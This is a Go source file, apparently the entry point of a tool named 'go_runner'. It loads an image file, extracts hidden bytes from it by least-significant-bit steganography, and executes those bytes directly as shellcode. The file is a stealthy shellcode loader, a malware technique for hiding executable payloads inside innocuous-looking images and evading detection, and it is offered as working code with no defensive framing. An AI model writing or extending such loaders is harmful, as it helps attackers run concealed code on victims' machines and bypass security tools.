package main

import (
	"os"
	"strconv"

	. "go_runner/algorithms"
	. "go_runner/image_sources"
	. "go_runner/payloads"
)

func main() {
	if len(os.Args) == 3 {
		payload_size, _ := strconv.Atoi(os.Args[1])
		payload_data := make([]byte, payload_size)

		location := os.Args[2]

		src := ImageFile{}
		alg := LSBX{1}
		pld := Shellcode{}

		img := src.Load(location)
		alg.Read(img, payload_data)
		pld.Run(payload_data)
	}
}
